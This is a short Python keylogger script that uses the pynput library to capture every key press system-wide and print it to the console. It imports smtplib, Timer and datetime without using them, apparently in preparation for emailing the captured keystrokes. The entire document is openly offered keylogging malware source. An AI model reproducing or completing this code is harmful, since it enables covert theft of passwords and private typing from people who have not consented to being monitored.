from pynput.keyboard import Listener
import smtplib
from threading import Timer
from datetime import datetime

def keylogger(keystroke):
    keystroke = str(keystroke)

    if keystroke =='Key.space':
        keystroke = ' '
    elif keystroke =='Key.shift_r':
        keystroke = ''
    elif keystroke == 'Key.enter':
        keystroke = '\n'

    print(keystroke)

with Listener(on_press=keylogger) as l:
    l.join()
